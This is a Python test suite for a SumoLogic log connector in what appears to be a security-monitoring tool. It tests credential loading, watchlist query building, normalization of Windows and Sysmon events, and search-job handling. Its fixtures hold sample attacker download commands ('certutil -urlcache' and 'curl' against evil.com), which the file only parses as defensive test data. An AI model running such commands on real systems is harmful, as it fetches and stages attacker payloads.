"""Tests for the SumoLogic connector module.

Tests cover:
- SumoConfig credential loading (file permissions, JSON parsing)
- SumoConfig query loading
- Query resolution with watchlist clause injection
- Windows Security Event normalization
- Linux Sysmon XML normalization
- Minimal normalization (field mapping, _raw JSON parsing)
- Output validation against canonical schema
- Search job lifecycle (create, poll, fetch, delete)
- Watchlist clause building
"""

import json
import os
import stat
import tempfile
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import pytest

from nabla.connectors.base import Watchlist
from nabla.connectors.sumologic import (
    CANONICAL_SCHEMA,
    SumoConfig,
    SumoLogicConnector,
    _DROP_FIELDS,
    _DONE_STATES,
)


# ── Fixtures ──


@pytest.fixture
def minimal_config():
    """Config with just enough to construct a connector."""
    return SumoConfig(
        host="https://api.sumologic.com/api",
        access_id="test_id",
        access_key="test_key",
        query_map={"auth": "user IN (*)", "endpoint": "process IN (*)"},
    )


@pytest.fixture
def connector(minimal_config):
    """A SumoLogicConnector with a minimal config."""
    return SumoLogicConnector(minimal_config)


@pytest.fixture
def empty_watchlist():
    return Watchlist()


@pytest.fixture
def sample_watchlist():
    return Watchlist(users=["admin", "jsmith"], hosts=["DC01"], ips=["10.0.1.50"])


# ── SumoConfig tests ──


class TestSumoConfig:
    """Tests for SumoConfig credential and query loading."""

    def test_default_values(self):
        """Config should have sensible defaults."""
        config = SumoConfig()
        assert config.host == ""
        assert config.access_id == ""
        assert config.access_key == ""
        assert config.verify_ssl is True
        assert config.validate_url is True
        assert config.max_results == 10_000
        assert config.poll_interval == 5.0
        assert config.poll_timeout == 300.0

    def test_load_credentials_from_file(self, tmp_path):
        """Credentials should be loaded from a JSON file."""
        creds_file = tmp_path / "creds.json"
        creds_file.write_text(json.dumps({"access_id": "my_id", "access_key": "my_key"}))
        # Make file owner-only
        os.chmod(creds_file, 0o600)

        config = SumoConfig(credentials_path=str(creds_file))
        assert config.access_id == "my_id"
        assert config.access_key == "my_key"

    def test_load_credentials_permissive_permissions(self, tmp_path):
        """Config should refuse to read credentials with group/other permissions."""
        creds_file = tmp_path / "creds.json"
        creds_file.write_text(json.dumps({"access_id": "id", "access_key": "key"}))
        os.chmod(creds_file, 0o644)  # group+other readable

        config = SumoConfig(credentials_path=str(creds_file))
        assert config.access_id == ""  # refused to read
        assert config.access_key == ""

    def test_load_credentials_missing_file(self, tmp_path):
        """Config should handle missing credentials file gracefully."""
        config = SumoConfig(credentials_path=str(tmp_path / "nonexistent.json"))
        assert config.access_id == ""

    def test_load_credentials_invalid_json(self, tmp_path):
        """Config should handle invalid JSON in credentials file."""
        creds_file = tmp_path / "creds.json"
        creds_file.write_text("{invalid json")
        os.chmod(creds_file, 0o600)

        config = SumoConfig(credentials_path=str(creds_file))
        assert config.access_id == ""

    def test_load_credentials_not_dict(self, tmp_path):
        """Config should handle non-dict JSON in credentials file."""
        creds_file = tmp_path / "creds.json"
        creds_file.write_text('"just a string"')
        os.chmod(creds_file, 0o600)

        config = SumoConfig(credentials_path=str(creds_file))
        assert config.access_id == ""

    def test_load_queries_from_file(self, tmp_path):
        """Queries should be loaded from a JSON file and merged into query_map."""
        queries_file = tmp_path / "queries.json"
        queries_file.write_text(json.dumps({
            "auth": "user IN (*) | where action=\"login\"",
            "endpoint": "process IN (*) | where action=\"process_create\"",
        }))

        config = SumoConfig(queries_path=str(queries_file))
        assert "auth" in config.query_map
        assert "login" in config.query_map["auth"]

    def test_load_queries_missing_file(self, tmp_path):
        """Config should handle missing queries file gracefully."""
        config = SumoConfig(queries_path=str(tmp_path / "nonexistent.json"))
        assert config.query_map == {}

    def test_load_queries_invalid_json(self, tmp_path):
        """Config should handle invalid JSON in queries file."""
        queries_file = tmp_path / "queries.json"
        queries_file.write_text("{invalid")
        config = SumoConfig(queries_path=str(queries_file))
        assert config.query_map == {}

    def test_load_queries_not_dict(self, tmp_path):
        """Config should handle non-dict JSON in queries file."""
        queries_file = tmp_path / "queries.json"
        queries_file.write_text('"just a string"')
        config = SumoConfig(queries_path=str(queries_file))
        assert config.query_map == {}


# ── Watchlist clause building ──


class TestWatchlistClause:
    """Tests for _build_watchlist_clause and _escape_query_value."""

    def test_escape_query_value(self, connector):
        """Double quotes should be escaped by doubling."""
        assert connector._escape_query_value('test"value') == 'test""value'
        assert connector._escape_query_value('normal') == 'normal'
        assert connector._escape_query_value('""') == '""""'

    def test_empty_watchlist(self, connector, empty_watchlist):
        """Empty watchlist should produce an empty clause."""
        assert connector._build_watchlist_clause(empty_watchlist) == ""

    def test_users_only(self, connector):
        """Watchlist with only users should produce a user clause."""
        wl = Watchlist(users=["admin", "jsmith"])
        clause = connector._build_watchlist_clause(wl)
        assert 'user IN ("admin", "jsmith")' in clause

    def test_hosts_only(self, connector):
        """Watchlist with only hosts should produce a _sourceHost clause."""
        wl = Watchlist(hosts=["DC01", "WEB01"])
        clause = connector._build_watchlist_clause(wl)
        assert '_sourceHost IN ("DC01", "WEB01")' in clause

    def test_ips_only(self, connector):
        """Watchlist with only IPs should produce a _sourceIP clause."""
        wl = Watchlist(ips=["10.0.1.50", "192.168.1.1"])
        clause = connector._build_watchlist_clause(wl)
        assert '_sourceIP IN ("10.0.1.50", "192.168.1.1")' in clause

    def test_all_entity_types(self, connector, sample_watchlist):
        """Watchlist with all types should produce OR-joined clauses."""
        clause = connector._build_watchlist_clause(sample_watchlist)
        assert "user IN" in clause
        assert "_sourceHost IN" in clause
        assert "_sourceIP IN" in clause
        assert " OR " in clause

    def test_special_chars_escaped(self, connector):
        """Values with double quotes should be escaped in the clause."""
        wl = Watchlist(users=['admin"evil'])
        clause = connector._build_watchlist_clause(wl)
        assert 'admin""evil' in clause


# ── Query resolution ──


class TestResolveQuery:
    """Tests for _resolve_query."""

    def test_no_watchlist_placeholder(self, connector, empty_watchlist):
        """Query without {watchlist_clause} should be returned as-is."""
        connector.config.query_map["auth"] = "user IN (*) | where action=\"login\""
        result = connector._resolve_query("auth", empty_watchlist)
        assert result == 'user IN (*) | where action="login"'

    def test_watchlist_placeholder_replaced(self, connector, sample_watchlist):
        """Query with {watchlist_clause} should have it replaced."""
        connector.config.query_map["auth"] = "user IN (*) {watchlist_clause} | where action=\"login\""
        result = connector._resolve_query("auth", sample_watchlist)
        assert "user IN (" in result
        assert "{watchlist_clause}" not in result
        assert '| where action="login"' in result

    def test_watchlist_placeholder_empty_watchlist(self, connector, empty_watchlist):
        """Query with {watchlist_clause} and empty watchlist should strip the placeholder."""
        connector.config.query_map["auth"] = "user IN (*) {watchlist_clause} | where action=\"login\""
        result = connector._resolve_query("auth", empty_watchlist)
        assert "{watchlist_clause}" not in result
        assert result.endswith('| where action="login"')

    def test_missing_query_raises(self, connector, empty_watchlist):
        """Missing query for a log type should raise ValueError."""
        with pytest.raises(ValueError, match="No SumoLogic query configured"):
            connector._resolve_query("nonexistent", empty_watchlist)


# ── Windows Security Event normalization ──


class TestNormalizeWindowsEvent:
    """Tests for _normalize_windows_event."""

    def test_login_event_4624(self):
        """Event ID 4624 should normalize to action=login."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01.example.com",
            "event_id": {"id": 4624},
            "event_data": {
                "TargetUserName": "admin",
                "IpAddress": "10.0.1.50",
                "LogonType": "10",
            },
            "keywords": ["Audit Success"],
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["action"] == "login"
        assert result["user"] == "admin"
        assert result["source_ip"] == "10.0.1.50"
        assert result["event_code"] == "4624"
        assert result["host"] == "DC01"
        assert result["timestamp"] == "2026-04-30T20:00:00.000Z"
        assert result["type"] == "auth"
        assert result["result"] == "Audit Success"

    def test_login_failed_4625(self):
        """Event ID 4625 should normalize to action=login_failed."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 4625},
            "event_data": {
                "TargetUserName": "attacker",
                "IpAddress": "45.33.32.156",
            },
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["action"] == "login_failed"
        assert result["user"] == "attacker"

    def test_account_created_4720(self):
        """Event ID 4720 should normalize to action=account_created."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 4720},
            "event_data": {"TargetUserName": "newuser"},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["action"] == "account_created"
        assert result["user"] == "newuser"

    def test_domain_stripped_from_user(self):
        """Domain prefix (DOMAIN\\user) should be stripped."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 4624},
            "event_data": {"TargetUserName": "QFUNCTION\\admin"},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["user"] == "admin"

    def test_machine_account_skipped(self):
        """Machine accounts (ending in $) should be excluded."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 4624},
            "event_data": {"TargetUserName": "DC01$"},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert "user" not in result

    def test_domain_suffix_stripped_from_computer(self):
        """Computer FQDN should be stripped to short name."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "WIN-SRV01.example.com",
            "event_id": {"id": 4624},
            "event_data": {},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["host"] == "WIN-SRV01"

    def test_endpoint_sysmon_image(self):
        """Endpoint events should extract process from Image field."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "WORKSTATION01",
            "event_id": {"id": 1},
            "event_data": {
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil -urlcache -f http://evil.com/payload.exe",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "User": "jsmith",
            },
        }
        result = SumoLogicConnector._normalize_windows_event(event, "endpoint")
        assert result["process"] == "certutil.exe"
        assert result["command_line"] == "certutil -urlcache -f http://evil.com/payload.exe"
        assert result["parent_process"] == "explorer.exe"

    def test_unknown_event_id(self):
        """Unknown event IDs should produce event_N action."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 9999},
            "event_data": {},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["action"] == "event_9999"

    def test_missing_system_time(self):
        """CLOCK-SPEC Rule 2 (round 6): missing system_time means ABSENT
        (the old now-default encoded the R6-14 bug)."""
        event = {
            "computer": "DC01",
            "event_id": {"id": 4624},
            "event_data": {},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert "timestamp" in result
        assert result["timestamp"] == ""

    def test_event_id_as_int(self):
        """event_id can be an integer directly (not a dict)."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": 4624,
            "event_data": {},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["action"] == "login"
        assert result["event_code"] == "4624"

    def test_subject_username_fallback(self):
        """SubjectUserName should be used if TargetUserName is missing."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 4672},
            "event_data": {"SubjectUserName": "SYSTEM"},
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert result["user"] == "SYSTEM"

    def test_long_message_truncated(self):
        """Long message field should be truncated to 500 chars."""
        event = {
            "system_time": "2026-04-30T20:00:00.000Z",
            "computer": "DC01",
            "event_id": {"id": 4624},
            "event_data": {},
            "message": "x" * 1000,
        }
        result = SumoLogicConnector._normalize_windows_event(event, "auth")
        assert len(result["details"]) == 500


# ── Linux Sysmon XML normalization ──


class TestNormalizeLinuxSysmonXml:
    """Tests for _normalize_linux_sysmon_xml."""

    def test_process_create_event(self):
        """Event ID 1 (Process Create) should normalize correctly."""
        raw = (
            'Apr 30 19:51:24 hostname sysmon[1234]: '
            '<Event><System><EventID>1</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>hostname.example.com</Computer>'
            '</System><EventData>'
            '<Data Name="Image">/usr/bin/curl</Data>'
            '<Data Name="CommandLine">curl http://evil.com/shell.sh</Data>'
            '<Data Name="User">root</Data>'
            '<Data Name="ParentImage">/usr/bin/bash</Data>'
            '<Data Name="IntegrityLevel">High</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
        assert result["action"] == "process_create"
        assert result["process"] == "curl"
        assert result["command_line"] == "curl http://evil.com/shell.sh"
        assert result["user"] == "root"
        assert result["parent_process"] == "bash"
        assert result["integrity_level"] == "High"
        assert result["host"] == "hostname"
        assert result["timestamp"] == "2026-04-30T19:51:24.000Z"

    def test_network_connect_event(self):
        """Event ID 3 (Network Connect) should normalize correctly."""
        raw = (
            'Apr 30 19:51:24 hostname sysmon[1234]: '
            '<Event><System><EventID>3</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>hostname</Computer>'
            '</System><EventData>'
            '<Data Name="SourceIp">10.0.1.100</Data>'
            '<Data Name="DestinationIp">45.33.32.156</Data>'
            '<Data Name="DestinationPort">443</Data>'
            '<Data Name="Protocol">6</Data>'
            '<Data Name="Image">/usr/bin/wget</Data>'
            '<Data Name="User">www-data</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "network")
        assert result["action"] == "network_connect"
        assert result["src_ip"] == "10.0.1.100"
        assert result["dst_ip"] == "45.33.32.156"
        assert result["dest_port"] == "443"
        assert result["protocol"] == "6"
        assert result["process"] == "wget"

    def test_dns_query_event(self):
        """Event ID 22 (DNS Query) should normalize correctly."""
        raw = (
            'Apr 30 19:51:24 hostname sysmon[1234]: '
            '<Event><System><EventID>22</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>hostname</Computer>'
            '</System><EventData>'
            '<Data Name="QueryName">evil.com</Data>'
            '<Data Name="Image">/usr/bin/nslookup</Data>'
            '<Data Name="User">nobody</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "dns")
        assert result["action"] == "dns_query"
        assert result["domain"] == "evil.com"
        assert result["process"] == "nslookup"

    def test_process_terminate_event(self):
        """Event ID 5 (Process Terminate) should normalize correctly."""
        raw = (
            'Apr 30 19:51:24 hostname sysmon[1234]: '
            '<Event><System><EventID>5</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>hostname</Computer>'
            '</System><EventData>'
            '<Data Name="Image">/usr/bin/python3</Data>'
            '<Data Name="User">admin</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
        assert result["action"] == "process_terminate"
        assert result["process"] == "python3"

    def test_unknown_event_id(self):
        """Unknown Sysmon event IDs should produce event_N action."""
        raw = (
            'Apr 30 19:51:24 hostname sysmon[1234]: '
            '<Event><System><EventID>99</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>hostname</Computer>'
            '</System><EventData></EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
        assert result["action"] == "event_99"

    def test_missing_timestamp(self):
        """CLOCK-SPEC Rule 2 (round 6): missing SystemTime means ABSENT —
        the old assertion (defaults to now) encoded the R6-14 bug."""
        raw = (
            '<Event><System><EventID>1</EventID>'
            '<Computer>hostname</Computer>'
            '</System><EventData>'
            '<Data Name="Image">/usr/bin/ls</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
        assert "timestamp" in result
        assert result["timestamp"] == ""

    def test_no_level_integrity(self):
        """IntegrityLevel 'no level' should not be included."""
        raw = (
            'Apr 30 19:51:24 hostname sysmon[1234]: '
            '<Event><System><EventID>1</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>hostname</Computer>'
            '</System><EventData>'
            '<Data Name="Image">/usr/bin/ls</Data>'
            '<Data Name="IntegrityLevel">no level</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
        assert "integrity_level" not in result

    def test_domain_suffix_stripped(self):
        """Computer FQDN should be stripped to short name."""
        raw = (
            '<Event><System><EventID>1</EventID>'
            '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
            '<Computer>web01.example.com</Computer>'
            '</System><EventData>'
            '<Data Name="Image">/usr/bin/ls</Data>'
            '</EventData></Event>'
        )
        result = SumoLogicConnector._normalize_linux_sysmon_xml(raw, "endpoint")
        assert result["host"] == "web01"


# ── Minimal normalization ──


class TestMinimalNormalize:
    """Tests for _minimal_normalize."""

    def test_raw_json_windows_event(self):
        """_raw JSON starting with { should be parsed as structured event."""
        raw = {
            "_raw": json.dumps({
                "system_time": "2026-04-30T20:00:00.000Z",
                "computer": "DC01",
                "event_id": {"id": 4624},
                "event_data": {"TargetUserName": "admin"},
            }),
            "_messagetime": 1746048000000,
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert result["action"] == "login"
        assert result["user"] == "admin"

    def test_raw_xml_sysmon_event(self):
        """_raw containing <Event> and <EventID> should be parsed as XML."""
        raw = {
            "_raw": (
                'Apr 30 19:51:24 hostname sysmon[1234]: '
                '<Event><System><EventID>1</EventID>'
                '<TimeCreated SystemTime="2026-04-30T19:51:24.000Z"/>'
                '<Computer>hostname</Computer>'
                '</System><EventData>'
                '<Data Name="Image">/usr/bin/curl</Data>'
                '</EventData></Event>'
            ),
        }
        result = SumoLogicConnector._minimal_normalize(raw, "endpoint")
        assert result["action"] == "process_create"
        assert result["process"] == "curl"

    def test_messagetime_epoch_ms(self):
        """_messagetime (epoch ms) should be converted to ISO timestamp."""
        raw = {
            "_messagetime": 1746048000000,
            "user": "admin",
            "action": "login",
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert "timestamp" in result
        # Should be a valid ISO string
        datetime.fromisoformat(result["timestamp"])

    def test_sourcehost_mapped_to_host(self):
        """_sourceHost should be mapped to host."""
        raw = {
            "_sourceHost": "DC01",
            "user": "admin",
            "action": "login",
            "timestamp": "2026-04-30T20:00:00Z",
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert result["host"] == "DC01"

    def test_sourcecategory_mapped_to_source(self):
        """_sourceCategory should be mapped to source."""
        raw = {
            "_sourceCategory": "Windows/Security",
            "user": "admin",
            "action": "login",
            "timestamp": "2026-04-30T20:00:00Z",
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert result["source"] == "Windows/Security"

    def test_drop_fields_excluded(self):
        """Internal SumoLogic fields should be dropped from output."""
        raw = {
            "_messageid": "123",
            "_sourceid": "456",
            "_raw": "some text",
            "_receipttime": "789",
            "user": "admin",
            "action": "login",
            "timestamp": "2026-04-30T20:00:00Z",
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        for field in _DROP_FIELDS:
            assert field not in result

    def test_type_field_set(self):
        """The type field should be set from the requested log_type."""
        raw = {"user": "admin", "action": "login", "timestamp": "2026-04-30T20:00:00Z"}
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert result["type"] == "auth"

    def test_existing_fields_preserved(self):
        """User-provided fields should be preserved as-is."""
        raw = {
            "user": "admin",
            "action": "login",
            "source_ip": "10.0.1.50",
            "timestamp": "2026-04-30T20:00:00Z",
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert result["user"] == "admin"
        assert result["source_ip"] == "10.0.1.50"

    def test_invalid_json_raw_falls_through(self):
        """Invalid JSON in _raw should fall through to field mapping."""
        raw = {
            "_raw": "{invalid json",
            "user": "admin",
            "action": "login",
            "timestamp": "2026-04-30T20:00:00Z",
        }
        result = SumoLogicConnector._minimal_normalize(raw, "auth")
        assert result["user"] == "admin"


# ── Output validation ──


class TestValidateOutput:
    """Tests for _validate_output."""

    def test_valid_auth_logs(self, connector):
        """Logs with all required fields should not warn."""
        logs = [
            {"timestamp": "2026-04-30T20:00:00Z", "user": "admin", "action": "login"},
            {"timestamp": "2026-04-30T20:01:00Z", "user": "jsmith", "action": "logoff"},
        ]
        # Should not raise
        connector._validate_output(logs, "auth")

    def test_missing_required_field_warns(self, connector, caplog):
        """Logs missing a required field in >90% of entries should warn."""
        logs = [
            {"timestamp": "2026-04-30T20:00:00Z", "user": "admin"},  # missing action
            {"timestamp": "2026-04-30T20:01:00Z", "user": "jsmith"},  # missing action
        ]
        import logging
        with caplog.at_level(logging.WARNING, logger="nabla.connectors.sumologic"):
            connector._validate_output(logs, "auth")
        assert any("required field 'action'" in r.message for r in caplog.records)

    def test_empty_logs(self, connector):
        """Empty log list should not raise."""
        connector._validate_output([], "auth")

    def test_unknown_log_type(self, connector):
        """Unknown log type should not raise."""
        connector._validate_output([{"foo": "bar"}], "unknown_type")


# ── Search job lifecycle ──


class TestSearchJobLifecycle:
    """Tests for _create_search_job, _poll_search_job, _fetch_messages, _delete_search_job."""

    def test_create_search_job(self, connector):
        """_create_search_job should POST to /v2/search/jobs and return job ID."""
        mock_response = MagicMock()
        mock_response.json.return_value = {"id": "job-123"}
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        job_id = connector._create_search_job(
            mock_client, "user IN (*)",
            from_ts="2026-04-30T19:00:00+00:00",
            to_ts="2026-04-30T20:00:00+00:00",
        )
        assert job_id == "job-123"
        mock_client.request.assert_called_once()
        call_args = mock_client.request.call_args
        assert call_args[0][0] == "POST"
        assert call_args[0][1] == "/v2/search/jobs"
        body = call_args[1]["json"]
        assert body["query"] == "user IN (*)"
        assert "from" in body
        assert "to" in body

    def test_create_search_job_no_id(self, connector):
        """_create_search_job should raise ValueError if no ID in response."""
        mock_response = MagicMock()
        mock_response.json.return_value = {"error": "bad request"}
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        with pytest.raises(ValueError, match="Could not extract search job ID"):
            connector._create_search_job(mock_client, "user IN (*)")

    def test_poll_search_job_done(self, connector):
        """_poll_search_job should return when job is DONE GATHERING RESULTS."""
        mock_response = MagicMock()
        mock_response.json.return_value = {
            "state": "DONE GATHERING RESULTS",
            "messageCount": 100,
        }
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        # Override poll_interval to avoid slow tests
        connector.config.poll_interval = 0.01

        result = connector._poll_search_job(mock_client, "job-123")
        assert result["state"] == "DONE GATHERING RESULTS"
        assert result["messageCount"] == 100

    def test_poll_search_job_timeout(self, connector):
        """_poll_search_job should raise TimeoutError if job doesn't complete."""
        mock_response = MagicMock()
        mock_response.json.return_value = {"state": "GATHERING RESULTS"}
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        connector.config.poll_timeout = 0.05
        connector.config.poll_interval = 0.01

        with pytest.raises(TimeoutError, match="did not complete"):
            connector._poll_search_job(mock_client, "job-123")

    def test_poll_search_job_cancelled(self, connector):
        """_poll_search_job should return CANCELLED state (it's in _DONE_STATES)."""
        mock_response = MagicMock()
        mock_response.json.return_value = {"state": "CANCELLED", "messageCount": 0}
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        connector.config.poll_interval = 0.01

        result = connector._poll_search_job(mock_client, "job-123")
        assert result["state"] == "CANCELLED"

    def test_fetch_messages_empty(self, connector):
        """_fetch_messages with 0 message count should return empty list."""
        mock_client = MagicMock()
        result = connector._fetch_messages(mock_client, "job-123", 0)
        assert result == []

    def test_fetch_messages_single_page(self, connector):
        """_fetch_messages should page through messages."""
        messages = [{"map": {"user": f"user_{i}", "action": "login"}} for i in range(5)]
        mock_response = MagicMock()
        mock_response.json.return_value = {"messages": messages}
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        result = connector._fetch_messages(mock_client, "job-123", 5)
        assert len(result) == 5
        assert result[0]["user"] == "user_0"

    def test_fetch_messages_respects_max_results(self, connector):
        """_fetch_messages should not exceed max_results."""
        connector.config.max_results = 3
        messages = [{"map": {"user": f"user_{i}"}} for i in range(3)]
        mock_response = MagicMock()
        mock_response.json.return_value = {"messages": messages}
        mock_response.raise_for_status = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.request.return_value = mock_response

        result = connector._fetch_messages(mock_client, "job-123", 100)
        assert len(result) == 3

    def test_delete_search_job(self, connector):
        """_delete_search_job should DELETE the job."""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_client = MagicMock()
        mock_client.request.return_value = mock_response
        connector._delete_search_job(mock_client, "job-123")
        mock_client.request.assert_called_once()
        call_args = mock_client.request.call_args
        assert call_args[0][0] == "DELETE"

    def test_delete_search_job_non_fatal(self, connector):
        """_delete_search_job should not raise on failure."""
        mock_client = MagicMock()
        mock_client.request.side_effect = Exception("connection error")
        # Should not raise
        connector._delete_search_job(mock_client, "job-123")


# ── fetch_logs integration ──


class TestFetchLogs:
    """Tests for the fetch_logs method."""

    def test_no_host_raises(self, connector):
        """fetch_logs should raise ValueError if host is not configured."""
        connector.config.host = ""
        with pytest.raises(ValueError, match="SumoLogic host not configured"):
            connector.fetch_logs(Watchlist(), "auth", None, None)

    def test_no_credentials_raises(self, connector):
        """fetch_logs should raise ValueError if credentials are missing."""
        connector.config.access_id = ""
        connector.config.access_key = ""
        with pytest.raises(ValueError, match="access_id and access_key"):
            connector.fetch_logs(Watchlist(), "auth", None, None)

    def test_no_query_returns_empty(self, connector):
        """fetch_logs should return empty list if no query for the log type."""
        result = connector.fetch_logs(Watchlist(), "nonexistent", None, None)
        assert result == []

    def test_available_log_types(self, connector):
        """available_log_types should return types with configured queries."""
        types = connector.available_log_types()
        assert "auth" in types
        assert "endpoint" in types
        assert "nonexistent" not in types


# ── Constants ──


class TestConstants:
    """Tests for module-level constants."""

    def test_done_states(self):
        """_DONE_STATES should include expected completion states."""
        assert "DONE GATHERING RESULTS" in _DONE_STATES
        assert "CANCELLED" in _DONE_STATES

    def test_drop_fields(self):
        """_DROP_FIELDS should include known SumoLogic internal fields."""
        assert "_raw" in _DROP_FIELDS
        assert "_messageid" in _DROP_FIELDS
        assert "_sourceid" in _DROP_FIELDS

    def test_canonical_schema_all_types(self):
        """CANONICAL_SCHEMA should define all four log types."""
        assert "auth" in CANONICAL_SCHEMA
        assert "network" in CANONICAL_SCHEMA
        assert "dns" in CANONICAL_SCHEMA
        assert "endpoint" in CANONICAL_SCHEMA

    def test_canonical_schema_required_fields(self):
        """Each log type should have required fields."""
        assert "timestamp" in CANONICAL_SCHEMA["auth"]["required"]
        assert "user" in CANONICAL_SCHEMA["auth"]["required"]
        assert "action" in CANONICAL_SCHEMA["auth"]["required"]
        assert "timestamp" in CANONICAL_SCHEMA["endpoint"]["required"]
        assert "process" in CANONICAL_SCHEMA["endpoint"]["required"]
